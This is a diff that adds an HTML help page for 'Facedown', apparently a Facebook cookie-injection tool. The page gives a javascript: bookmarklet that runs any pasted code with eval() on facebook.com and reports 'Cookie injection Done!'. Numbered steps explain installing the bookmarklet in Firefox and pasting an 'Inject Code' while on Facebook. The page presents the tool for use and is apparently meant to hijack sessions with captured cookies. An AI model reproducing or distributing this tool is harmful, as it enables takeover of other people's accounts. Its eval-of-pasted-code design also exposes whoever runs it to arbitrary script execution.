@@ -1,0 +1,21 @@
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="style_help.css" />
+<title> What's This? | Facedown</title>
+<script> function goBack(){ window.location="inject.htm"; } </script>
+</head>
+<body>
+<div class="user">
+<p id="writing">1- Copy This Code Here:</p>
+<p><textarea style="resize:none" rows="1" cols="30" readonly>
+javascript:{var url=window.prompt("FaceDown Javascript Url Cookie Injector","Paste[Ctr+V] Your Code Here");eval(url);alert("Cookie injection Done! Refreshing");window.location="http://www.facebook.com";}
+</textarea></p>
+<p id="writing">2- Make A new Bookmark in Firefox</p>
+<a href="1.png"><img src="1_thumbnail.png" width="256" height="160"></a>
+<p id="writing">3- Paste The Preivous Code to Make it as The Bookmark location<br/>(Now You Have The FaceDown Script Injector)</p>
+<a href="2.png"><img src="2_thumbnail.png" width="256" height="160"></a>
+<p id="writing">4 -Copying The "Inject Code" <br/>5-Press Go To Facebook<br/>6-Press On the (FaceDown Script Injector)<br/>7-Paste The "Inject Code"</p>
+<input type="button" onclick="goBack()" value="Now You Understand Go Back" /> 
+</div>
+</body>
+</html>
